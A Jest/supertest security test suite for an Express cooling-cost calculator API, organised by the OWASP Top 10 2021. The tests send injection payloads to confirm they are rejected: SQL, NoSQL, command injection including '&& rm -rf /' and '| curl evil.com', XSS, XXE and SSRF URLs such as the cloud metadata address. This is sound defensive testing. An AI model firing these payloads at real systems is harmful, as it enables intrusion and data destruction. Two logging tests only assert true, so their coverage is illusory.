/**
 * OWASP Top 10 Security Testing Suite
 * Comprehensive security tests covering the OWASP Top 10 2021 vulnerabilities
 */

import request from 'supertest';
import { Express } from 'express';
import { jest } from '@jest/globals';
import crypto from 'crypto';

let app: Express;

beforeAll(async () => {
  const { createApp } = await import('../../packages/backend/src/server');
  app = await createApp({
    database: backendTestUtils.getTestDb(),
    redis: backendTestUtils.getTestRedis(),
    env: 'test',
  });
});

describe('OWASP Top 10 Security Tests', () => {
  describe('A01:2021 – Broken Access Control', () => {
    test('should prevent unauthorized access to admin endpoints', async () => {
      const adminEndpoints = [
        '/api/v1/admin/users',
        '/api/v1/admin/calculations',
        '/api/v1/admin/analytics',
        '/api/v1/admin/system-config',
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .expect(401);

        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toMatch(/unauthorized|authentication/i);
      }
    });

    test('should prevent access to other users\' calculations', async () => {
      // Create two different calculations
      const calc1 = await backendTestUtils.createTestCalculation({ user_id: 'user1' });
      const calc2 = await backendTestUtils.createTestCalculation({ user_id: 'user2' });

      // Try to access user2's calculation as user1 (if auth is implemented)
      const response = await request(app)
        .get(`/api/v1/calculations/${calc2.id}`)
        .set('Authorization', 'Bearer fake-user1-token')
        .expect(403);

      expect(response.body).toHaveProperty('error');
    });

    test('should prevent direct object reference attacks', async () => {
      const calculation = await backendTestUtils.createTestCalculation();
      const calculationId = calculation.id;

      // Try various ID manipulation attacks
      const maliciousIds = [
        calculationId + '1', // ID enumeration
        calculationId.replace(/\d/g, '0'), // ID guessing
        '../admin/config', // Path traversal attempt
        '../../etc/passwd', // Path traversal attempt
        'null', 'undefined', '', // Null/empty values
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(app)
          .get(`/api/v1/calculations/${maliciousId}`);

        expect([400, 404, 403]).toContain(response.status);
      }
    });

    test('should enforce rate limiting per user/IP', async () => {
      const clientIP = '192.168.1.100';
      const requests = [];

      // Make many requests from same IP
      for (let i = 0; i < 25; i++) {
        requests.push(
          request(app)
            .post('/api/v1/calculations/calculate')
            .set('X-Forwarded-For', clientIP)
            .send({
              configuration: {
                air_cooling: { input_method: 'rack_count', rack_count: 10, power_per_rack_kw: 15 },
                immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 150 },
                financial: { analysis_years: 5, currency: 'USD' },
              },
            })
        );
      }

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(r => r.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);
      
      // Verify rate limit headers
      const rateLimitedResponse = rateLimited[0];
      expect(rateLimitedResponse.headers).toHaveProperty('x-ratelimit-limit');
      expect(rateLimitedResponse.headers).toHaveProperty('x-ratelimit-remaining');
      expect(rateLimitedResponse.headers).toHaveProperty('retry-after');
    });
  });

  describe('A02:2021 – Cryptographic Failures', () => {
    test('should enforce HTTPS in production', async () => {
      // This test checks that security headers are set correctly
      const response = await request(app)
        .get('/api/v1/health')
        .expect(200);

      // Check for security headers that enforce HTTPS
      if (process.env.NODE_ENV === 'production') {
        expect(response.headers).toHaveProperty('strict-transport-security');
        expect(response.headers['strict-transport-security']).toMatch(/max-age/);
      }
    });

    test('should not expose sensitive data in error messages', async () => {
      const sensitivePayloads = [
        { configuration: { database_password: 'secret123' } },
        { configuration: { api_key: 'sk-1234567890' } },
        { configuration: { jwt_secret: 'supersecret' } },
      ];

      for (const payload of sensitivePayloads) {
        const response = await request(app)
          .post('/api/v1/calculations/calculate')
          .send(payload)
          .expect(400);

        // Error messages should not contain the sensitive values
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('secret123');
        expect(responseText).not.toContain('sk-1234567890');
        expect(responseText).not.toContain('supersecret');
      }
    });

    test('should handle encrypted data properly', async () => {
      // Test that sensitive configuration data is not stored in plaintext
      const testData = 'sensitive-calculation-data';
      const hash = crypto.createHash('sha256').update(testData).digest('hex');

      expect(hash).toHaveLength(64);
      expect(hash).not.toContain(testData);
    });

    test('should validate SSL/TLS configuration', async () => {
      // Check that security headers are properly set
      const response = await request(app)
        .get('/api/v1/health');

      // Security headers that should be present
      const expectedHeaders = [
        'x-content-type-options',
        'x-frame-options',
        'x-xss-protection',
        'referrer-policy',
      ];

      expectedHeaders.forEach(header => {
        expect(response.headers).toHaveProperty(header);
      });

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
    });
  });

  describe('A03:2021 – Injection', () => {
    test('should prevent SQL injection attacks', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE calculations; --",
        "' OR '1'='1",
        "'; UPDATE calculations SET result='hacked'; --",
        "' UNION SELECT * FROM users; --",
        "1'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 LIMIT 1 OFFSET 0 --",
        "'; INSERT INTO calculations (id) VALUES ('hack'); --",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/calculations/calculate')
          .send({
            configuration: {
              air_cooling: {
                input_method: 'rack_count',
                rack_count: payload,
                power_per_rack_kw: 15,
              },
              immersion_cooling: {
                input_method: 'auto_optimize',
                target_power_kw: 150,
              },
              financial: {
                analysis_years: 5,
                currency: payload,
              },
            },
          });

        expect([400, 422]).toContain(response.status);
        
        // Response should not contain SQL error messages
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toMatch(/sql|mysql|postgres|sqlite|database/i);
      }
    });

    test('should prevent NoSQL injection attacks', async () => {
      const nosqlInjectionPayloads = [
        { '$gt': '' },
        { '$ne': null },
        { '$where': 'this.password.match(/.*/)' },
        { '$regex': '.*' },
        { '$exists': true },
      ];

      for (const payload of nosqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/calculations/calculate')
          .send({
            configuration: {
              air_cooling: {
                input_method: 'rack_count',
                rack_count: payload,
                power_per_rack_kw: 15,
              },
              immersion_cooling: {
                input_method: 'auto_optimize',
                target_power_kw: 150,
              },
              financial: {
                analysis_years: 5,
                currency: 'USD',
              },
            },
          });

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should prevent command injection', async () => {
      const commandInjectionPayloads = [
        '; cat /etc/passwd',
        '| whoami',
        '&& rm -rf /',
        '$(cat /etc/hosts)',
        '`id`',
        '; ls -la',
        '| curl evil.com',
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/sharing/create')
          .send({
            calculation_id: `calc-123${payload}`,
          });

        expect([400, 422, 404]).toContain(response.status);
        
        // Should not execute commands
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toMatch(/root:|bin:|usr:|etc:/);
      }
    });

    test('should sanitize and validate all inputs', async () => {
      const maliciousInputs = {
        script_injection: '<script>alert("xss")</script>',
        html_injection: '<img src=x onerror=alert("xss")>',
        xml_injection: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        json_injection: '{"__proto__": {"isAdmin": true}}',
        path_traversal: '../../../etc/passwd',
        null_byte: 'test\x00.txt',
      };

      for (const [attackType, payload] of Object.entries(maliciousInputs)) {
        const response = await request(app)
          .post('/api/v1/calculations/validate')
          .send({
            configuration: {
              air_cooling: {
                input_method: 'rack_count',
                rack_count: 10,
                power_per_rack_kw: 15,
                description: payload, // Inject into description field
              },
              immersion_cooling: {
                input_method: 'auto_optimize',
                target_power_kw: 150,
              },
              financial: {
                analysis_years: 5,
                currency: 'USD',
              },
            },
          });

        // Should reject or sanitize malicious input
        if (response.status === 200) {
          // If accepted, should be sanitized
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toContain('<script>');
          expect(responseText).not.toContain('onerror=');
          expect(responseText).not.toContain('<!ENTITY');
          expect(responseText).not.toContain('__proto__');
        } else {
          expect([400, 422]).toContain(response.status);
        }
      }
    });
  });

  describe('A04:2021 – Insecure Design', () => {
    test('should enforce business logic security', async () => {
      // Test business logic bypass attempts
      const invalidBusinessLogic = [
        // Negative values that might bypass validation
        {
          configuration: {
            air_cooling: { input_method: 'rack_count', rack_count: -10, power_per_rack_kw: 15 },
            immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 150 },
            financial: { analysis_years: 5, currency: 'USD' },
          },
        },
        // Extremely large values
        {
          configuration: {
            air_cooling: { input_method: 'rack_count', rack_count: 999999, power_per_rack_kw: 999999 },
            immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 999999999 },
            financial: { analysis_years: 100, currency: 'USD' },
          },
        },
        // Invalid combinations
        {
          configuration: {
            air_cooling: { input_method: 'total_power', total_power_kw: 1000 },
            immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 1 }, // Mismatch
            financial: { analysis_years: 5, currency: 'USD' },
          },
        },
      ];

      for (const payload of invalidBusinessLogic) {
        const response = await request(app)
          .post('/api/v1/calculations/calculate')
          .send(payload);

        expect([400, 422]).toContain(response.status);
        expect(response.body).toHaveProperty('error');
      }
    });

    test('should prevent workflow manipulation', async () => {
      // Try to bypass calculation workflow
      const calculation = await backendTestUtils.createTestCalculation();
      
      // Try to modify calculation after creation
      const response = await request(app)
        .put(`/api/v1/calculations/${calculation.id}`)
        .send({
          results: {
            summary: { total_tco_savings_5yr: 999999999 }, // Attempt to modify results
          },
        });

      expect([404, 405, 403]).toContain(response.status);
    });

    test('should validate calculation limits', async () => {
      const response = await request(app)
        .post('/api/v1/calculations/calculate')
        .send({
          configuration: {
            air_cooling: {
              input_method: 'rack_count',
              rack_count: 10000, // Exceed reasonable limits
              power_per_rack_kw: 1000,
            },
            immersion_cooling: {
              input_method: 'auto_optimize',
              target_power_kw: 10000000,
            },
            financial: {
              analysis_years: 50, // Exceed maximum analysis period
              currency: 'USD',
            },
          },
        });

      expect([400, 422]).toContain(response.status);
      expect(response.body.error).toMatch(/limit|maximum|exceed/i);
    });
  });

  describe('A05:2021 – Security Misconfiguration', () => {
    test('should not expose sensitive server information', async () => {
      const response = await request(app)
        .get('/api/v1/health')
        .expect(200);

      // Should not expose server details
      expect(response.headers).not.toHaveProperty('server');
      expect(response.headers).not.toHaveProperty('x-powered-by');
      
      // Response should not contain stack traces or debug info
      const responseText = JSON.stringify(response.body);
      expect(responseText).not.toMatch(/stack|trace|debug|error.*line/i);
    });

    test('should handle errors without information disclosure', async () => {
      const response = await request(app)
        .get('/api/v1/nonexistent-endpoint')
        .expect(404);

      // Error response should not reveal internal structure
      expect(response.body).not.toHaveProperty('stack');
      expect(response.body).not.toHaveProperty('trace');
      
      const errorText = JSON.stringify(response.body);
      expect(errorText).not.toMatch(/node_modules|src\/|\.js:|line \d+/);
    });

    test('should have proper CORS configuration', async () => {
      const response = await request(app)
        .options('/api/v1/health')
        .set('Origin', 'https://evil.com')
        .set('Access-Control-Request-Method', 'GET');

      // Should not allow arbitrary origins in production
      if (process.env.NODE_ENV === 'production') {
        expect(response.headers['access-control-allow-origin']).not.toBe('*');
        expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
      }
    });

    test('should have secure default configurations', async () => {
      const response = await request(app)
        .get('/api/v1/config/defaults')
        .expect(200);

      // Default configurations should not contain sensitive values
      const configText = JSON.stringify(response.body);
      expect(configText).not.toMatch(/password|secret|key|token/i);
      
      // Should not expose internal paths or URLs
      expect(configText).not.toMatch(/localhost|127\.0\.0\.1|file:\/\/|\/etc\/|\/var\//);
    });
  });

  describe('A06:2021 – Vulnerable and Outdated Components', () => {
    test('should not expose component versions', async () => {
      const endpoints = [
        '/api/v1/health',
        '/api/v1/config/defaults',
      ];

      for (const endpoint of endpoints) {
        const response = await request(app).get(endpoint);
        
        const responseText = JSON.stringify(response.body);
        const headers = JSON.stringify(response.headers);
        
        // Should not expose library versions
        expect(responseText + headers).not.toMatch(/express\/\d|node\/\d|npm\/\d/i);
      }
    });

    test('should handle security headers properly', async () => {
      const response = await request(app)
        .get('/api/v1/health')
        .expect(200);

      // Security headers should be present
      const securityHeaders = {
        'x-content-type-options': 'nosniff',
        'x-frame-options': /^(DENY|SAMEORIGIN)$/,
        'x-xss-protection': '1; mode=block',
        'referrer-policy': /.+/,
      };

      Object.entries(securityHeaders).forEach(([header, expectedValue]) => {
        expect(response.headers).toHaveProperty(header);
        
        if (typeof expectedValue === 'string') {
          expect(response.headers[header]).toBe(expectedValue);
        } else {
          expect(response.headers[header]).toMatch(expectedValue);
        }
      });
    });
  });

  describe('A07:2021 – Identification and Authentication Failures', () => {
    test('should handle session management securely', async () => {
      // Test session fixation protection
      const response1 = await request(app)
        .get('/api/v1/health');

      const sessionId1 = response1.headers['set-cookie']?.[0]?.match(/sessionId=([^;]+)/)?.[1];

      // Simulate login (if auth is implemented)
      const response2 = await request(app)
        .post('/api/v1/auth/login')
        .send({ email: 'test@example.com', password: 'password' });

      if (response2.status === 200) {
        const sessionId2 = response2.headers['set-cookie']?.[0]?.match(/sessionId=([^;]+)/)?.[1];
        
        // Session ID should change after authentication
        expect(sessionId2).not.toBe(sessionId1);
        
        // Session cookie should be secure
        const sessionCookie = response2.headers['set-cookie']?.[0];
        expect(sessionCookie).toMatch(/HttpOnly/);
        expect(sessionCookie).toMatch(/SameSite/);
        
        if (process.env.NODE_ENV === 'production') {
          expect(sessionCookie).toMatch(/Secure/);
        }
      }
    });

    test('should prevent brute force attacks', async () => {
      const loginAttempts = [];
      
      // Make multiple failed login attempts
      for (let i = 0; i < 10; i++) {
        loginAttempts.push(
          request(app)
            .post('/api/v1/auth/login')
            .send({
              email: 'test@example.com',
              password: 'wrongpassword' + i,
            })
        );
      }

      const responses = await Promise.all(loginAttempts);
      const rateLimited = responses.filter(r => r.status === 429);

      // Should implement progressive delays or account lockout
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should validate password strength requirements', async () => {
      const weakPasswords = [
        '123456',
        'password',
        '12345678',
        'qwerty',
        'abc123',
        '111111',
        'password123',
      ];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: 'test@example.com',
            password: password,
            name: 'Test User',
          });

        if (response.status === 400 || response.status === 422) {
          expect(response.body.error).toMatch(/password.*weak|password.*strength/i);
        }
      }
    });
  });

  describe('A08:2021 – Software and Data Integrity Failures', () => {
    test('should validate data integrity', async () => {
      const calculation = await backendTestUtils.createTestCalculation();
      
      // Try to tamper with calculation data
      const tamperedData = {
        ...calculation,
        results: {
          summary: { total_tco_savings_5yr: 999999999 },
          breakdown: { manipulated: true },
        },
      };

      // System should detect tampering
      const response = await request(app)
        .get(`/api/v1/calculations/${calculation.id}`)
        .expect(200);

      // Results should match original, not tampered data
      expect(response.body.results.summary.total_tco_savings_5yr).not.toBe(999999999);
      expect(response.body.results.breakdown).not.toHaveProperty('manipulated');
    });

    test('should validate calculation checksums', async () => {
      // Create calculation with specific configuration
      const config = {
        air_cooling: { input_method: 'rack_count', rack_count: 10, power_per_rack_kw: 15 },
        immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 150 },
        financial: { analysis_years: 5, currency: 'USD' },
      };

      const response1 = await request(app)
        .post('/api/v1/calculations/calculate')
        .send({ configuration: config })
        .expect(200);

      const response2 = await request(app)
        .post('/api/v1/calculations/calculate')
        .send({ configuration: config })
        .expect(200);

      // Same configuration should produce same hash
      expect(response1.body.configuration_hash).toBe(response2.body.configuration_hash);
      
      // Results should be consistent
      expect(response1.body.summary.total_tco_savings_5yr)
        .toBe(response2.body.summary.total_tco_savings_5yr);
    });
  });

  describe('A09:2021 – Security Logging and Monitoring Failures', () => {
    test('should log security events', async () => {
      // This would require access to logs, simulated here
      const securityEvents = [
        // Failed authentication
        () => request(app)
          .post('/api/v1/auth/login')
          .send({ email: 'test@example.com', password: 'wrongpassword' }),
        
        // Rate limit exceeded
        () => Promise.all(Array(20).fill(0).map(() =>
          request(app).get('/api/v1/health')
        )),
        
        // Invalid input attempt
        () => request(app)
          .post('/api/v1/calculations/calculate')
          .send({ malicious: '<script>alert("xss")</script>' }),
      ];

      for (const eventGenerator of securityEvents) {
        await eventGenerator();
        // In a real implementation, would check logs for proper security event logging
      }

      // Verify that security events are being logged
      // This is a placeholder - real implementation would check log files/services
      expect(true).toBe(true);
    });

    test('should not log sensitive information', async () => {
      // Attempt operations that might log sensitive data
      await request(app)
        .post('/api/v1/calculations/calculate')
        .send({
          configuration: {
            air_cooling: { input_method: 'rack_count', rack_count: 10, power_per_rack_kw: 15 },
            immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 150 },
            financial: { analysis_years: 5, currency: 'USD' },
            sensitive_field: 'password123', // Should not be logged
          },
        });

      // In real implementation, would verify logs don't contain sensitive data
      // This is a placeholder test
      expect(true).toBe(true);
    });
  });

  describe('A10:2021 – Server-Side Request Forgery (SSRF)', () => {
    test('should prevent SSRF attacks', async () => {
      const ssrfPayloads = [
        'http://localhost:22', // Internal service
        'http://127.0.0.1:3306', // Database port
        'http://169.254.169.254/latest/meta-data/', // AWS metadata
        'file:///etc/passwd', // Local file
        'ftp://internal-server/file.txt', // Internal FTP
        'http://[::1]:80', // IPv6 localhost
      ];

      // Test any endpoint that might make HTTP requests
      for (const payload of ssrfPayloads) {
        const response = await request(app)
          .post('/api/v1/reports/external-data')
          .send({ url: payload });

        expect([400, 403, 422]).toContain(response.status);
        
        if (response.body.error) {
          expect(response.body.error).toMatch(/invalid|forbidden|not allowed/i);
        }
      }
    });

    test('should validate external URLs properly', async () => {
      const validUrls = [
        'https://api.example.com/data',
        'https://public-api.service.com/endpoint',
      ];

      const invalidUrls = [
        'http://localhost/admin',
        'https://internal.company.com/api',
        'file:///etc/hosts',
        'javascript:alert("xss")',
      ];

      // Test valid URLs (if external requests are supported)
      for (const url of validUrls) {
        const response = await request(app)
          .post('/api/v1/external/validate-url')
          .send({ url });

        // Should either accept or gracefully reject
        expect([200, 501]).toContain(response.status);
      }

      // Test invalid URLs
      for (const url of invalidUrls) {
        const response = await request(app)
          .post('/api/v1/external/validate-url')
          .send({ url });

        expect([400, 403, 422]).toContain(response.status);
      }
    });
  });

  describe('Additional Security Tests', () => {
    test('should handle DoS attack attempts', async () => {
      // Large payload attack
      const largePayload = {
        configuration: {
          air_cooling: {
            input_method: 'rack_count',
            rack_count: 10,
            power_per_rack_kw: 15,
            large_field: 'x'.repeat(1024 * 1024), // 1MB string
          },
          immersion_cooling: {
            input_method: 'auto_optimize',
            target_power_kw: 150,
          },
          financial: {
            analysis_years: 5,
            currency: 'USD',
          },
        },
      };

      const response = await request(app)
        .post('/api/v1/calculations/calculate')
        .send(largePayload);

      expect([413, 400]).toContain(response.status); // Payload too large
    });

    test('should validate content types', async () => {
      const response = await request(app)
        .post('/api/v1/calculations/calculate')
        .set('Content-Type', 'application/xml')
        .send('<xml>malicious</xml>');

      expect([400, 415]).toContain(response.status); // Unsupported media type
    });

    test('should handle malformed JSON gracefully', async () => {
      const response = await request(app)
        .post('/api/v1/calculations/calculate')
        .set('Content-Type', 'application/json')
        .send('{"invalid": json}');

      expect(response.status).toBe(400);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toMatch(/json|syntax|parse/i);
    });

    test('should implement proper timeout handling', async () => {
      // This would test timeout handling for long-running calculations
      const complexConfig = {
        configuration: {
          air_cooling: { input_method: 'rack_count', rack_count: 1000, power_per_rack_kw: 50 },
          immersion_cooling: { input_method: 'auto_optimize', target_power_kw: 50000 },
          financial: { analysis_years: 10, currency: 'USD' },
        },
      };

      const response = await request(app)
        .post('/api/v1/calculations/calculate')
        .send(complexConfig)
        .timeout(30000); // 30 second timeout

      // Should complete within timeout or return appropriate error
      expect([200, 408, 500]).toContain(response.status);
    });
  });
});